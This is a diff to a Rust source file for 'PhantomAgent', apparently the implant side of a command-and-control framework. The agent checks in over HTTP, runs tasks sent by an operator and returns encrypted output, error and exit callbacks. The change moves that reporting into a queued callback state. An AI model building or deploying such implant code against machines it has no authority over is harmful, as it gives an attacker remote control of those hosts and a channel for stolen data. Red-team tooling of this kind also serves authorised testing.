@@ -9,12 +9,12 @@ use red_cell_common::crypto::{
 use red_cell_common::demon::DemonCommand;
 use tracing::{info, warn};
 
-use crate::command::{CommandResult, execute};
+use crate::command::{PendingCallback, PhantomState, execute};
 use crate::config::PhantomConfig;
 use crate::error::PhantomError;
 use crate::protocol::{
-    AgentMetadata, build_error_packet, build_exit_packet, build_init_packet, build_output_packet,
-    callback_ctr_blocks, parse_init_ack, parse_tasking_response,
+    AgentMetadata, build_callback_packet, build_init_packet, callback_ctr_blocks, parse_init_ack,
+    parse_tasking_response,
 };
 use crate::transport::HttpTransport;
 
@@ -28,6 +28,7 @@ pub struct PhantomAgent {
     transport: HttpTransport,
     send_ctr_offset: u64,
     recv_ctr_offset: u64,
+    state: PhantomState,
 }
 
 impl PhantomAgent {
@@ -53,6 +54,7 @@ impl PhantomAgent {
             transport,
             send_ctr_offset: 0,
             recv_ctr_offset: 0,
+            state: PhantomState::default(),
         })
     }
 
@@ -103,6 +105,9 @@ impl PhantomAgent {
 
     /// Send a `COMMAND_CHECKIN` and process the returned task stream.
     pub async fn checkin(&mut self) -> Result<bool, PhantomError> {
+        self.state.poll().await?;
+        self.flush_pending_callbacks().await?;
+
         let payload = red_cell_common::demon::DemonMessage::new(vec![
             red_cell_common::demon::DemonPackage::new(DemonCommand::CommandCheckin, 0, Vec::new()),
         ])
@@ -129,42 +134,22 @@ impl PhantomAgent {
 
         let mut exit_requested = false;
         for package in tasking.packages {
-            match execute(&package).await? {
-                CommandResult::Output(text) if !text.is_empty() => {
-                    self.send_packet(build_output_packet(
-                        self.agent_id,
-                        &self.session_crypto,
-                        self.send_ctr_offset,
-                        package.request_id,
-                        &text,
-                    )?)
-                    .await?;
-                    self.send_ctr_offset += callback_ctr_blocks(4 + text.len());
-                }
-                CommandResult::Error(text) => {
-                    self.send_packet(build_error_packet(
-                        self.agent_id,
-                        &self.session_crypto,
-                        self.send_ctr_offset,
-                        package.request_id,
-                        &text,
-                    )?)
-                    .await?;
-                    self.send_ctr_offset += callback_ctr_blocks(8 + text.len());
-                }
-                CommandResult::Exit(exit_method) => {
-                    self.send_packet(build_exit_packet(
-                        self.agent_id,
-                        &self.session_crypto,
-                        self.send_ctr_offset,
-                        package.request_id,
-                        exit_method,
-                    )?)
-                    .await?;
-                    self.send_ctr_offset += callback_ctr_blocks(4);
+            execute(&package, &mut self.state).await?;
+            for callback in self.state.drain_callbacks() {
+                let payload = callback.payload()?;
+                let packet = build_callback_packet(
+                    self.agent_id,
+                    &self.session_crypto,
+                    self.send_ctr_offset,
+                    callback.command_id(),
+                    callback.request_id(),
+                    &payload,
+                )?;
+                self.send_packet(packet).await?;
+                self.send_ctr_offset += callback_ctr_blocks(payload.len());
+                if matches!(callback, PendingCallback::Exit { .. }) {
                     exit_requested = true;
                 }
-                CommandResult::Output(_) | CommandResult::Empty => {}
             }
         }
 
@@ -217,6 +202,24 @@ impl PhantomAgent {
 
     async fn send_packet(&self, packet: Vec<u8>) -> Result<(), PhantomError> {
         let _response = self.transport.send(&packet).await?;
+        Ok(())
+    }
+
+    async fn flush_pending_callbacks(&mut self) -> Result<(), PhantomError> {
+        for callback in self.state.drain_callbacks() {
+            let payload = callback.payload()?;
+            let packet = build_callback_packet(
+                self.agent_id,
+                &self.session_crypto,
+                self.send_ctr_offset,
+                callback.command_id(),
+                callback.request_id(),
+                &payload,
+            )?;
+            self.send_packet(packet).await?;
+            self.send_ctr_offset += callback_ctr_blocks(payload.len());
+        }
+
         Ok(())
     }
 }
